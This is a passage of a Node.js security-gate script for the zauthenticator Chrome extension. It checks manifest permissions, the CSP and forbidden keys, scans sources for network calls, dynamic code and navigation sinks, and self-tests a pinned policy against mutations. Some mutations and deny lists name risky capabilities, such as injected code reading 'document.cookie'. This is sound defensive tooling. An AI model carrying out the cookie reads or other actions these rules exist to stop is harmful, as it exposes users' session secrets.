  if (problems.length) return [false, problems.join('; ')];
  return [true, `${vendorFiles.length} vendored files match SHA256SUMS, one entry each`];
}

// Returns [{ rule, ok, detail }] in RULES order.
function runChecks(extDir) {
  const results = [];
  const record = (rule, ok, detail) => results.push({ rule, ok, detail });
  const base = path.basename(extDir);
  const label = (rel) => `${base}/${rel}`;

  if (!fs.existsSync(path.join(extDir, 'manifest.json'))) {
    const where = shownPath(path.join(extDir, 'manifest.json'));
    record('extension-dir', false, `${where} not found; the extension sources are missing`);
    return results;
  }
  record('extension-dir', true, shownPath(extDir));

  let manifest;
  try {
    manifest = JSON.parse(fs.readFileSync(path.join(extDir, 'manifest.json'), 'utf8'));
    if (manifest === null || typeof manifest !== 'object' || Array.isArray(manifest)) throw new Error('not a JSON object');
  } catch (err) {
    manifest = undefined;
    record('manifest', false, `manifest.json unreadable: ${err.message}`);
  }
  if (manifest) {
    record(
      'manifest',
      manifest.manifest_version === 3,
      manifest.manifest_version === 3 ? 'manifest_version 3' : `manifest_version ${manifest.manifest_version} (must be 3)`,
    );

    const { allowedPermissions, absentOrEmptyKeys, optionalHostPermissions, forbiddenKeys } = MANIFEST_POLICY;
    const perms = manifest.permissions ?? [];
    const permProblems = [];
    if (!Array.isArray(perms)) permProblems.push('permissions is not an array');
    else {
      const bad = perms.filter((p) => !allowedPermissions.includes(p));
      if (bad.length) permProblems.push(`not allowed: ${bad.join(', ')}`);
    }
    for (const key of absentOrEmptyKeys) {
      if (!Object.hasOwn(manifest, key)) continue;
      const value = manifest[key];
      if (!Array.isArray(value)) permProblems.push(`${key} is not an array`);
      else if (value.length) permProblems.push(`${key} must be absent or empty, has: ${value.join(', ')}`);
    }
    // Compared as sorted lists, so a repeated or an extra pattern is a difference.
    const optionalHosts = manifest.optional_host_permissions;
    const approvedHosts = JSON.stringify(optionalHostPermissions);
    if (!Object.hasOwn(manifest, 'optional_host_permissions')) permProblems.push(`optional_host_permissions missing (approved: ${approvedHosts})`);
    else if (!Array.isArray(optionalHosts)) permProblems.push(`optional_host_permissions is not an array`);
    else if (JSON.stringify([...optionalHosts].sort()) !== JSON.stringify([...optionalHostPermissions].sort())) {
      permProblems.push(`optional_host_permissions is ${JSON.stringify(optionalHosts)} (approved: exactly ${approvedHosts})`);
    }
    record(
      'permissions',
      permProblems.length === 0,
      permProblems.length === 0
        ? `[${perms.join(', ')}] within {${allowedPermissions.join(', ')}}; optional_host_permissions exactly ${approvedHosts}; ${absentOrEmptyKeys.join(', ')} absent or empty`
        : permProblems.join('; '),
    );

    const present = forbiddenKeys.filter((k) => Object.hasOwn(manifest, k));
    record('manifest-keys', present.length === 0, present.length === 0 ? `none of ${forbiddenKeys.join(', ')}` : `forbidden: ${present.join(', ')}`);

    const approvedBackground = canonicalJson(MANIFEST_POLICY.background);
    if (!Object.hasOwn(manifest, 'background')) record('background', false, `background missing (approved: exactly ${approvedBackground})`);
    else {
      const got = canonicalJson(manifest.background);
      record('background', got === approvedBackground, got === approvedBackground ? `exactly ${approvedBackground}` : `background is ${got} (approved: exactly ${approvedBackground})`);
    }

    if (!Object.hasOwn(manifest, 'homepage_url')) record('homepage-url', true, 'absent');
    else
      record(
        'homepage-url',
        manifest.homepage_url === HOMEPAGE_URL,
        manifest.homepage_url === HOMEPAGE_URL ? HOMEPAGE_URL : `${JSON.stringify(manifest.homepage_url)} (only ${HOMEPAGE_URL} allowed)`,
      );

    const csp = manifest.content_security_policy;
    const cspProblems = [];
    let directiveCount = 0;
    if (csp === null || typeof csp !== 'object' || Array.isArray(csp) || typeof csp.extension_pages !== 'string') {
      cspProblems.push('content_security_policy.extension_pages missing');
    } else {
      for (const key of Object.keys(csp)) {
        if (key !== 'extension_pages') cspProblems.push(`content_security_policy.${key} is not allowed (only extension_pages)`);
      }
      cspProblems.push(...cspDifferences(csp.extension_pages, MANIFEST_POLICY.extensionPagesCsp));
      for (const [key, value] of Object.entries(csp)) {
        if (typeof value !== 'string') continue;
        for (const token of FORBIDDEN_CSP_TOKENS) {
          if (value.toLowerCase().includes(token)) cspProblems.push(`${key} contains ${token}`);
        }
      }
      directiveCount = parseCsp(csp.extension_pages).directives.size;
    }
    record(
      'csp',
      cspProblems.length === 0,
      cspProblems.length === 0 ? `extension_pages equals the approved policy (${directiveCount} directives), no other CSP keys` : cspProblems.join('; '),
    );
  } else {
    for (const rule of ['permissions', 'manifest-keys', 'background', 'homepage-url', 'csp']) record(rule, false, 'manifest.json unreadable');
  }

  const files = walk(extDir).filter((f) => !IGNORED_NAMES.has(path.basename(f.rel)));

  const typeProblems = [];
  for (const f of files) {
    if (f.kind !== 'file') {
      typeProblems.push(`${label(f.rel)} is a ${f.kind}, not a regular file`);
      continue;
    }
    if (f.rel === SUMS_PATH) continue;
    const ext = path.extname(f.rel);
    if (!ALLOWED_FILE_EXTENSIONS.includes(ext)) {
      typeProblems.push(`${label(f.rel)} has disallowed type ${JSON.stringify(ext || path.basename(f.rel))}`);
      continue;
    }
    if (ext === '.png') {
      const head = Buffer.alloc(8);
      const fd = fs.openSync(f.abs, 'r');
      fs.readSync(fd, head, 0, 8, 0);
      fs.closeSync(fd);
      if (!head.equals(PNG_SIGNATURE)) typeProblems.push(`${label(f.rel)} is not a PNG file`);
    }
  }
  record(
    'file-types',
    typeProblems.length === 0,
    typeProblems.length === 0 ? `${files.length} files, all of ${ALLOWED_FILE_EXTENSIONS.join(' ')} SHA256SUMS` : typeProblems.join('; '),
  );

  const own = files.filter((f) => f.kind === 'file' && !f.rel.startsWith('vendor/'));
  const scanned = own.filter((f) => /\.(js|html)$/.test(f.rel));
  const styles = own.filter((f) => f.rel.endsWith('.css'));
  const network = [];
  const dynamic = [];
  const urls = [];
  const navigation = [];
  const scripting = [];
  const permissionsUse = [];
  const inline = [];
  for (const f of scanned) {
    const text = fs.readFileSync(f.abs, 'utf8');
    network.push(...findAll(text, NETWORK_PATTERNS, label(f.rel)));
    dynamic.push(...findAll(text, DYNAMIC_CODE_PATTERNS, label(f.rel)));
    urls.push(...findAll(text, URL_PATTERNS, label(f.rel)));
    navigation.push(...navigationHits(text, label(f.rel), f.rel));
    if (f.rel.endsWith('.js')) navigation.push(...globalObjectHits(text, label(f.rel)));
    const scoped = scopedApiHits(text, label(f.rel), f.rel);
    scripting.push(...scoped.scripting);
    permissionsUse.push(...scoped.permissions);
    if (f.rel.endsWith('.html')) inline.push(...inlineScriptHits(text, label(f.rel)));
  }
  const css = styles.flatMap((f) => findAll(fs.readFileSync(f.abs, 'utf8'), CSS_PATTERNS, label(f.rel)));
  const htmlCount = scanned.filter((f) => f.rel.endsWith('.html')).length;
  const scope = `${scanned.length} .js/.html files outside vendor/`;
  record('network-api', network.length === 0, network.length === 0 ? `none in ${scope}` : network.join('; '));
  record('dynamic-code', dynamic.length === 0, dynamic.length === 0 ? `none in ${scope}` : dynamic.join('; '));
  record('remote-url', urls.length === 0, urls.length === 0 ? `no http(s):// in ${scope}` : urls.join('; '));
  record(
    'css-remote',
    css.length === 0,
    css.length === 0 ? `no @import, remote url( or http(s):// in ${styles.length} .css files outside vendor/` : css.join('; '),
  );
  record(
    'navigation',
    navigation.length === 0,
    navigation.length === 0
      ? `no navigation sink in ${scope}; outside ${NAV_WRAPPER} no chrome.windows and only chrome.tabs.{${MANIFEST_POLICY.tabsMethodsOutsideNav.join(', ')}}`
      : navigation.join('; '),
  );

  // The one file allowed to open tabs and windows must be exactly the reviewed one.
  const wrapper = files.find((f) => f.rel === NAV_WRAPPER);
  const pin = MANIFEST_POLICY.navWrapperSha256;
  if (!wrapper) record('nav-wrapper', false, `${label(NAV_WRAPPER)} missing (the only file allowed to open tabs and windows, pinned by sha256)`);
  else if (wrapper.kind !== 'file') record('nav-wrapper', false, `${label(NAV_WRAPPER)} is a ${wrapper.kind}, not a regular file`);
  else {
    const got = sha256(wrapper.abs);
    record('nav-wrapper', got === pin, got === pin ? `${label(NAV_WRAPPER)} sha256 ${pin} (pinned)` : `${label(NAV_WRAPPER)} sha256 ${got} != pinned ${pin}`);
  }
  record(
    'scripting-api',
    scripting.length === 0,
    scripting.length === 0
      ? `chrome.scripting only in ${MANIFEST_POLICY.scriptingFiles.join(', ')} (${scope}), only chrome.scripting.{${MANIFEST_POLICY.scriptingMethods.join(', ')}}`
      : scripting.join('; '),
  );
  record(
    'permissions-api',
    permissionsUse.length === 0,
    permissionsUse.length === 0
      ? `chrome.permissions only in ${MANIFEST_POLICY.permissionsFiles.join(', ')}; elsewhere only chrome.permissions.{${MANIFEST_POLICY.permissionsMembersAnywhere.join(', ')}}`
      : permissionsUse.join('; '),
  );
  // The content script and the functions injected into pages: held to the content-script lists,
  // registered and injected under no other name.
  const contentHits = [];
  for (const rel of MANIFEST_POLICY.contentScriptFiles) {
    const f = files.find((x) => x.rel === rel);
    if (!f) contentHits.push(`${label(rel)} missing (listed in contentScriptFiles)`);
    else if (f.kind !== 'file') contentHits.push(`${label(rel)} is a ${f.kind}, not a regular file`);
    else contentHits.push(...contentScriptHits(fs.readFileSync(f.abs, 'utf8'), label(rel)));
  }
  const registered = [];
  const injectedCount = new Map(MANIFEST_POLICY.injectedFunctions.map((name) => [name, 0]));
  for (const rel of MANIFEST_POLICY.scriptingFiles) {
    const f = files.find((x) => x.rel === rel && x.kind === 'file');
    if (!f) continue;
    const r = scriptingFileHits(fs.readFileSync(f.abs, 'utf8'), label(rel));
    contentHits.push(...r.hits);
    registered.push(...r.named);
    for (const [name, n] of r.injected) injectedCount.set(name, injectedCount.get(name) + n);
  }
  for (const [name, n] of injectedCount) {
    if (n !== 1) {
      const where = MANIFEST_POLICY.scriptingFiles.join(', ');
      contentHits.push(`injected function ${name} ${n === 0 ? 'not found' : `found ${n} times`} as function ${name}(...) { ... } in ${where} (listed in injectedFunctions)`);
    }
  }
  record(
    'content-script-sinks',
    contentHits.length === 0,
    contentHits.length === 0
      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]; injected func: [${MANIFEST_POLICY.injectedFunctions.join(', ')}] held to the same lists (plus reads of ${MANIFEST_POLICY.injectedReads.join(', ')}), each one top-level declaration named nowhere else, no files or css; executeScript and registration options are literals with keys {${MANIFEST_POLICY.injectionKeys.join(', ')}} and {${MANIFEST_POLICY.registrationKeys.join(', ')}}`
      : contentHits.join('; '),
  );
  record('inline-script', inline.length === 0, inline.length === 0 ? `no inline <script> or on*= in ${htmlCount} .html files` : inline.join('; '));

  const locales = files.filter((f) => f.kind === 'file' && /^_locales\/.+\/messages\.json$/.test(f.rel));
  const localeUrls = locales.flatMap((f) => findAll(fs.readFileSync(f.abs, 'utf8'), URL_PATTERNS, label(f.rel)));
  record(
    'locales-url',
    localeUrls.length === 0,
    localeUrls.length === 0 ? `no http(s):// in ${locales.length} _locales messages.json files` : localeUrls.join('; '),
  );

  const [sumsOk, sumsDetail] = checkVendorSums(extDir, files, label);
  record('vendor-sums', sumsOk, sumsDetail);

  // Every vendored .js ships its license beside it: vendor/x.js -> vendor/x.LICENSE.
  const present = new Set(files.map((f) => f.rel));
  const vendoredJs = files.filter((f) => f.rel.startsWith('vendor/') && f.rel.endsWith('.js'));
  const unlicensed = vendoredJs.filter((f) => !present.has(f.rel.replace(/\.js$/, '.LICENSE')));
  record(
    'vendor-license',
    unlicensed.length === 0,
    unlicensed.length === 0
      ? `${vendoredJs.length} vendored .js files each have a sibling .LICENSE`
      : unlicensed.map((f) => `${label(f.rel)} has no ${path.basename(f.rel, '.js')}.LICENSE beside it`).join('; '),
  );

  return results;
}

function printAndExit(results) {
  for (const r of results) console.log(`${r.ok ? 'PASS' : 'FAIL'} ${r.rule} ${r.detail}`);
  process.exitCode = results.every((r) => r.ok) ? 0 : 1;
}

// ---------------------------------------------------------------------------------------------
// Self-test: the policy pin, one clean fixture, negative controls that must stay clean, and one
// fixture per violation that must fail exactly the expected rule(s).

// MANIFEST_POLICY written out a second time, by hand. Nothing here may be derived from
// MANIFEST_POLICY: widening the policy means editing both, and the self-test fails until then.
// List order does not matter; strings must match exactly.
const PINNED_POLICY = {
  allowedPermissions: ['activeTab', 'contextMenus', 'scripting', 'storage'],
  absentOrEmptyKeys: ['optional_permissions'],
  optionalHostPermissions: ['https://*/*'],
  background: { type: 'module', service_worker: 'background.js' },
  forbiddenKeys: [
    'chrome_url_overrides',
    'content_scripts',
    'declarative_net_request',
    'externally_connectable',
    'host_permissions',
    'key',
    'oauth2',
    'sandbox',
    'update_url',
    'web_accessible_resources',
  ],
  homepageUrl: 'https://github.com/2lab-ai/zauthenticator',
  extensionPagesCsp:
    "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'",
  navWrapperSha256: 'b0f323da96fc1cad5cbd0e15d64d7caf2c279bf29902c2a7112bd65fcb945822',
  tabsMethodsOutsideNav: ['captureVisibleTab', 'getCurrent'],
  scriptingFiles: ['lib/autofill-worker.js'],
  scriptingMethods: [
    'unregisterContentScripts', 'updateContentScripts', 'registerContentScripts', 'getRegisteredContentScripts',
    'executeScript',
  ],
  injectedFunctions: ['fillFocused'],
  injectedReads: ['location.origin'],
  injectionKeys: ['args', 'func', 'target'],
  injectionTargetKeys: ['frameIds', 'tabId'],
  registrationKeys: ['persistAcrossSessions', 'runAt', 'allFrames', 'js', 'matches', 'id'],
  permissionsFiles: ['popup/popup.js', 'lib/autofill-worker.js'],
  permissionsMembersAnywhere: ['onAdded', 'onRemoved', 'contains'],
  contentScriptFiles: ['content/autofill.js', 'lib/fieldfind.js'],
  contentScriptMembers: [
    'zauthFieldFind', 'width', 'visible', 'visibilityState', 'visibility', 'value', 'validMs', 'URL', 'type', 'trim',
    'toLowerCase', 'test', 'split', 'some', 'shadowRoot', 'removeEventListener', 'readyState',
    'readOnly', 'querySelectorAll', 'push', 'persisted', 'parentElement', 'observe', 'maxLength',
    'matches', 'map', 'length', 'isTrusted', 'isArray', 'indexOf', 'includes', 'hidden', 'height', 'has', 'group',
    'getRootNode', 'getComputedStyle', 'getClientRects', 'getBoundingClientRect', 'getAttribute',
    'from', 'freeze', 'forEach', 'findIndex', 'findInDocument', 'filter', 'every', 'display',
    'dispatchEvent', 'disconnect', 'disabled', 'code', 'checkVisibility', 'attrs', 'addEventListener',
    'add', 'activeElement',
  ],
  contentScriptConstructors: ['WeakSet', 'Set', 'MutationObserver', 'Event'],
  contentScriptEvents: ['change', 'input'],
  contentScriptChrome: ['runtime.id', 'runtime.sendMessage'],
};

// Differences between two policies, [] when equal. Lists compare as sorted copies (so a
// duplicate entry is a difference), objects by their keys and values, everything else exactly.
function policyDifferences(actual, pinned) {
  const problems = [];
  const keys = new Set([...Object.keys(actual), ...Object.keys(pinned)]);
  for (const key of [...keys].sort()) {
    const a = actual[key];
    const p = pinned[key];
    if (!Object.hasOwn(actual, key) || !Object.hasOwn(pinned, key)) {
      problems.push(`${key} only in ${Object.hasOwn(actual, key) ? 'MANIFEST_POLICY' : 'PINNED_POLICY'}`);
    } else if (Array.isArray(a) || Array.isArray(p)) {
      const sa = Array.isArray(a) ? [...a].sort() : a;
      const sp = Array.isArray(p) ? [...p].sort() : p;
      if (JSON.stringify(sa) !== JSON.stringify(sp)) problems.push(`${key}: ${JSON.stringify(sa)} != pinned ${JSON.stringify(sp)}`);
    } else if ((a !== null && typeof a === 'object') || (p !== null && typeof p === 'object')) {
      if (canonicalJson(a) !== canonicalJson(p)) problems.push(`${key}: ${canonicalJson(a)} != pinned ${canonicalJson(p)}`);
    } else if (a !== p) {
      problems.push(`${key}: ${JSON.stringify(a)} != pinned ${JSON.stringify(p)}`);
    }
  }
  return problems;
}

// Each edit of a copy of PINNED_POLICY must be reported against MANIFEST_POLICY, naming the field.
const PIN_MUTATIONS = [
  ['allowedPermissions', (p) => p.allowedPermissions.push('tabs')],
  ['allowedPermissions', (p) => p.allowedPermissions.push('storage')],
  ['allowedPermissions', (p) => (p.allowedPermissions = p.allowedPermissions.filter((k) => k !== 'scripting'))],
  ['absentOrEmptyKeys', (p) => p.absentOrEmptyKeys.pop()],
  ['absentOrEmptyKeys', (p) => p.absentOrEmptyKeys.push('optional_host_permissions')],
  ['optionalHostPermissions', (p) => p.optionalHostPermissions.push('http://*/*')],
  ['optionalHostPermissions', (p) => (p.optionalHostPermissions = ['<all_urls>'])],
  ['background', (p) => (p.background.persistent = false)],
  ['background', (p) => (p.background.service_worker = 'background.test.js')],
  ['background', (p) => delete p.background.type],
  ['forbiddenKeys', (p) => (p.forbiddenKeys = p.forbiddenKeys.filter((k) => k !== 'content_scripts'))],
  ['forbiddenKeys', (p) => (p.forbiddenKeys = p.forbiddenKeys.filter((k) => k !== 'host_permissions'))],
  ['homepageUrl', (p) => (p.homepageUrl = 'https://github.com/2lab-ai/zauthenticator/')],
  ['extensionPagesCsp', (p) => (p.extensionPagesCsp = p.extensionPagesCsp.replace("img-src 'self' data: blob:", 'img-src *'))],
  ['navWrapperSha256', (p) => (p.navWrapperSha256 = `${p.navWrapperSha256.slice(0, -1)}0`)],
  ['tabsMethodsOutsideNav', (p) => p.tabsMethodsOutsideNav.push('create')],
  ['scriptingFiles', (p) => p.scriptingFiles.push('background.js')],
  ['scriptingFiles', (p) => (p.scriptingFiles = ['popup/popup.js'])],
  ['scriptingMethods', (p) => p.scriptingMethods.push('insertCSS')],
  ['scriptingMethods', (p) => (p.scriptingMethods = p.scriptingMethods.filter((m) => m !== 'executeScript'))],
  ['injectedFunctions', (p) => p.injectedFunctions.push('fillAll')],
  ['injectedFunctions', (p) => (p.injectedFunctions = [])],
  ['injectedReads', (p) => p.injectedReads.push('location.href')],
  ['injectedReads', (p) => p.injectedReads.push('document.cookie')],
  ['injectionKeys', (p) => p.injectionKeys.push('world')],
  ['injectionKeys', (p) => (p.injectionKeys = p.injectionKeys.filter((k) => k !== 'func'))],
  ['injectionTargetKeys', (p) => p.injectionTargetKeys.push('allFrames')],
  ['registrationKeys', (p) => p.registrationKeys.push('world')],
  ['registrationKeys', (p) => p.registrationKeys.push('matchOriginAsFallback')],
  ['permissionsFiles', (p) => p.permissionsFiles.push('popup/settings.js')],
  ['permissionsFiles', (p) => p.permissionsFiles.pop()],
  ['permissionsMembersAnywhere', (p) => p.permissionsMembersAnywhere.push('request')],
  ['permissionsMembersAnywhere', (p) => p.permissionsMembersAnywhere.push('getAll')],
  ['contentScriptFiles', (p) => p.contentScriptFiles.push('content/other.js')],
  ['contentScriptFiles', (p) => p.contentScriptFiles.pop()],
  ['contentScriptMembers', (p) => p.contentScriptMembers.push('src')],
  ['contentScriptMembers', (p) => p.contentScriptMembers.push('postMessage')],
  ['contentScriptMembers', (p) => (p.contentScriptMembers = p.contentScriptMembers.filter((m) => m !== 'value'))],
  ['contentScriptMembers', (p) => (p.contentScriptMembers = p.contentScriptMembers.filter((m) => m !== 'validMs'))],
  ['contentScriptMembers', (p) => (p.contentScriptMembers = p.contentScriptMembers.filter((m) => m !== 'isTrusted'))],
  ['contentScriptMembers', (p) => (p.contentScriptMembers = p.contentScriptMembers.filter((m) => m !== 'URL'))],
  ['contentScriptMembers', (p) => p.contentScriptMembers.push('pathname')],
  ['contentScriptConstructors', (p) => p.contentScriptConstructors.push('Image')],
  ['contentScriptEvents', (p) => p.contentScriptEvents.push('submit')],
  ['contentScriptChrome', (p) => p.contentScriptChrome.push('runtime.connect')],
  ['contentScriptChrome', (p) => (p.contentScriptChrome = ['runtime.sendMessage'])],
  ['newField', (p) => (p.newField = [])],
];

const ONE_PIXEL_PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'base64',
);

const APPROVED_CSP =
  "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'";

// extension/lib/nav.js, byte for byte. Written out here rather than read from the repository so
// the self-test does not depend on where the script runs; its sha256 must equal the pin.
const NAV_WRAPPER_SOURCE = [
  "// The only code in the extension that opens a tab or a window. Every destination is this",
  "// extension's own popup page with one of the fixed view names below; nothing else can be passed in.",
  '// The trust gate pins this file by sha256 and rejects tab/window-opening calls anywhere else.',
  '',
  "const TAB_VIEWS = new Set(['add-file', 'settings']);",
  "const WINDOW_VIEWS = new Set(['bind', 'unlock']);",
  '',
  '/** Opens popup/popup.html#<view> of this extension in a new tab. */',
  'export async function openOwnView(view) {',
  '  if (!TAB_VIEWS.has(view)) throw new Error(`Unknown view: ${view}`);',
  '  await chrome.tabs.create({ url: chrome.runtime.getURL(`popup/popup.html#${view}`) });',
  '}',
  '',
  '/** Opens popup/popup.html#<view> of this extension in a small popup window. */',
  'export async function openOwnWindow(view) {',
  '  if (!WINDOW_VIEWS.has(view)) throw new Error(`Unknown view: ${view}`);',
  '  await chrome.windows.create({',
  '    url: chrome.runtime.getURL(`popup/popup.html#${view}`),',
  "    type: 'popup',",
  '    width: 400,',
  '    height: 600,',
  '  });',
  '}',
  '',
].join('\n');

// The auto-fill files of the clean fixture: the worker module with its chrome.scripting and
// chrome.permissions calls, the entry that wires it, and the content script.
const WORKER_SOURCE = [
  "// Context menu, codes for bound sites, script registration.",
  "import { openOwnWindow } from './nav.js';",
  "const CONTENT_SCRIPTS = ['lib/fieldfind.js', 'content/autofill.js'];",
  "export async function handleMenuClick(info, tab) {",
  "  const frameIds = [info.frameId ?? 0];",
  "  await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] });",
  "  const origin = new URL(info.frameUrl ?? info.pageUrl).origin;",
  "  if (origin.startsWith('https:')) await openOwnWindow('bind');",
  "}",
  "// Injected into the frame the menu was opened in: fills the focused field, or its run of boxes.",
  "function fillFocused(code) {",
  "  let el = document.activeElement;",
  "  while (el && el.shadowRoot && el.shadowRoot.activeElement) el = el.shadowRoot.activeElement;",
  "  const textTypes = ['text', 'tel', 'number', 'password', 'search', 'email', 'url'];",
  "  const writable = (input) =>",
  "    (input instanceof HTMLTextAreaElement || (input instanceof HTMLInputElement && textTypes.includes(input.type))) &&",
  "    !input.matches(':disabled') &&",
  "    !input.readOnly;",
  "  if (!writable(el)) return false;",
  "  const put = (input, value) => {",
  "    input.value = value;",
  "    input.dispatchEvent(new Event('input', { bubbles: true }));",
  "    input.dispatchEvent(new Event('change', { bubbles: true }));",
  "  };",
  "  if (el instanceof HTMLInputElement && el.maxLength === 1) {",
  "    const boxes = Array.from(el.getRootNode().querySelectorAll('input')).filter((input) => input.maxLength === 1 && writable(input));",
  "    if (boxes.length === code.length && boxes.includes(el)) {",
  "      boxes.forEach((box, i) => put(box, code[i]));",
  "      return true;",
  "    }",
  "  }",
  "  put(el, code);",
  "  return true;",
  "}",
  "export async function syncRegistrations(origins) {",
  "  const matches = origins.map((origin) => `${origin}/*`);",
  "  const [current] = await chrome.scripting.getRegisteredContentScripts({ ids: ['autofill'] });",
  "  const script = { id: 'autofill', matches, js: CONTENT_SCRIPTS, allFrames: true, runAt: 'document_idle', persistAcrossSessions: true };",
  "  if (matches.length === 0 && current) await chrome.scripting.unregisterContentScripts({ ids: ['autofill'] });",
  "  else if (current) await chrome.scripting.updateContentScripts([script]);",
  "  else await chrome.scripting.registerContentScripts([script]);",
  "  const granted = await chrome.permissions.getAll();",
  "  const stale = (granted.origins ?? []).filter((pattern) => !matches.includes(pattern));",
  "  if (stale.length) await chrome.permissions.remove({ origins: stale });",
  "}",
  "export async function handleMessage(message, sender) {",
  "  if (sender.id !== chrome.runtime.id || message?.type !== 'autofill-code') return { code: null };",
  "  const origin = sender.origin ?? new URL(sender.url).origin;",
  "  return { code: origin === 'x' ? '123456' : null };",
  "}",
  "",
].join('\n');
const BACKGROUND_SOURCE = [
  "import * as worker from './lib/autofill-worker.js';",
  "chrome.runtime.onInstalled.addListener(() => worker.syncRegistrations([]));",
  "chrome.contextMenus.onClicked.addListener((info, tab) => worker.handleMenuClick(info, tab));",
  "chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {",
  "  worker.handleMessage(message, sender).then(sendResponse);",
  "  return true;",
  "});",
  "chrome.permissions.onRemoved.addListener(() => worker.syncRegistrations([]));",
  "",
].join('\n');
const CONTENT_SOURCE = [
  "// Runs in every frame of a bound origin after lib/fieldfind.js: asks the worker for a code and",
  "// fills an empty field once. The shapes of content/autofill.js.",
  "(() => {",
  "  'use strict';",
  "  const finder = globalThis.zauthFieldFind;",
  "  if (!finder) return;",
  "  const CODE = /^\\d{6,8}$/;",
  "  const WATCHED_ATTRIBUTES = ['style', 'class', 'hidden', 'type', 'autocomplete', 'name', 'id'];",
  "  const seen = new WeakSet();",
  "  let stopped = false;",
  "  let settleTimer = 0;",
  "  const observer = new MutationObserver(schedule);",
  "  observer.observe(document, { subtree: true, childList: true, attributes: true, attributeFilter: WATCHED_ATTRIBUTES });",
  "  const deadline = setTimeout(stop, 60 * 1000);",
  "  look();",
  "  function schedule() {",
  "    if (stopped || settleTimer) return;",
  "    settleTimer = setTimeout(() => {",
  "      settleTimer = 0;",
  "      look();",
  "    }, 100);",
  "  }",
  "  async function look() {",
  "    const fields = finder.findInDocument(document);",
  "    if (stopped || !fields || fields.some((el) => seen.has(el))) return;",
  "    let code = null;",
  "    try {",
  "      const reply = await chrome.runtime.sendMessage({ type: 'autofill-code' });",
  "      if (reply && typeof reply.code === 'string' && CODE.test(reply.code)) code = reply.code;",
  "    } catch {",
  "      // the worker could not be reached",
  "    }",
  "    if (code === null) return stop();",
  "    for (const el of fields) seen.add(el);",
  "    const [el] = fields;",
  "    if (fields.length === 1 && el.value === '' && !(el.maxLength >= 0 && el.maxLength < code.length)) put(el, code);",
  "    else if (fields.length === code.length) fields.forEach((box, i) => put(box, code[i]));",
  "  }",
  "  function put(el, value) {",
  "    el.value = value;",
  "    el.dispatchEvent(new Event('input', { bubbles: true }));",
  "    el.dispatchEvent(new Event('change', { bubbles: true }));",
  "  }",
  "  function stop() {",
  "    stopped = true;",
  "    observer.disconnect();",
  "    clearTimeout(settleTimer);",
  "    clearTimeout(deadline);",
  "  }",
  "})();",
  "",
].join('\n');
const FIELDFIND_SOURCE = [
  "// One-time-code field detection; defines the zauthFieldFind global. The shapes of lib/fieldfind.js.",
  "'use strict';",
  "(() => {",
  "  const NAME_PATTERN = /(otp|totp|2fa|one.?time|verification)/i;",
  "  const NAMED_ATTRIBUTES = ['name', 'id', 'aria-label', 'placeholder'];",
  "  const CODE_TYPES = new Set(['', 'text', 'tel', 'number']);",
  "  const ATTRIBUTES = ['type', 'autocomplete', 'inputmode', 'maxlength', ...NAMED_ATTRIBUTES];",
  "  function attribute(field, name) {",
  "    const value = field && field.attrs ? field.attrs[name] : undefined;",
  "    return typeof value === 'string' ? value : '';",
  "  }",
  "  function maxLength(field) {",
  "    const raw = attribute(field, 'maxlength').trim();",
  "    return /^\\d+$/.test(raw) ? Number(raw) : -1;",
  "  }",
  "  const isFillable = (field) =>",
  "    field.visible === true && CODE_TYPES.has(attribute(field, 'type').trim().toLowerCase()) && field.disabled !== true && field.readOnly !== true && field.value === '';",
  "  const RULES = [",
  "    (field) => attribute(field, 'autocomplete').toLowerCase().split(/\\s+/).includes('one-time-code'),",
  "    (field) => NAMED_ATTRIBUTES.some((name) => NAME_PATTERN.test(attribute(field, name))),",
  "    (field) => maxLength(field) >= 6,",
  "  ];",
  "  function findOtpField(fields) {",
  "    const list = Array.isArray(fields) ? fields.filter((f) => f !== null && typeof f === 'object') : [];",
  "    for (const rule of RULES) {",
  "      const index = list.findIndex((field) => isFillable(field) && rule(field));",
  "      if (index !== -1) return [fields.indexOf(list[index])];",
  "    }",
  "    return null;",
  "  }",
  "  function groupOf(el) {",
  "    const parent = el.parentElement;",
  "    if (parent && parent.parentElement && parent.querySelectorAll('input').length === 1) return parent.parentElement;",
  "    return parent;",
  "  }",
  "  function isVisible(el) {",
  "    if (typeof el.checkVisibility === 'function') return el.checkVisibility({ visibilityProperty: true, checkVisibilityCSS: true });",
  "    return el.getClientRects().length > 0;",
  "  }",
  "  function describe(el) {",
  "    const attrs = {};",
  "    for (const name of ATTRIBUTES) {",
  "      const value = el.getAttribute(name);",
  "      if (value !== null) attrs[name] = value;",
  "    }",
  "    return { attrs, value: typeof el.value === 'string' ? el.value : '', disabled: el.matches(':disabled'), readOnly: el.readOnly === true, visible: isVisible(el), group: groupOf(el) };",
  "  }",
  "  function findInDocument(root) {",
  "    const inputs = Array.from(root.querySelectorAll('input'));",
  "    const found = findOtpField(inputs.map(describe));",
  "    return found ? found.map((i) => inputs[i]) : null;",
  "  }",
  "  globalThis.zauthFieldFind = Object.freeze({ findOtpField, findInDocument, groupOf });",
  "})();",
  "",
].join('\n');

// The clean fixture carries the shapes the real extension uses that must NOT trip a rule
// (member .open() calls, open() declarations and method shorthand, location reads, the
// chrome.tabs reads other files may make, tabs opened through lib/nav.js, plain forms, JSDoc
// generics, CSS data: urls, chrome.scripting in the worker, chrome.permissions in the worker
// and the two popup files, chrome.permissions.contains/onRemoved elsewhere, and the content
// script's two files in the shapes the real ones have, registered through a const list held by
// a const registration object, as the real worker does).
function cleanFixture() {
  return {
    manifest: {
      manifest_version: 3,
      name: 'zauthenticator',
      version: '0.2.0',
      permissions: ['storage', 'activeTab', 'contextMenus', 'scripting'],
      optional_host_permissions: ['https://*/*'],
      background: { service_worker: 'background.js', type: 'module' },
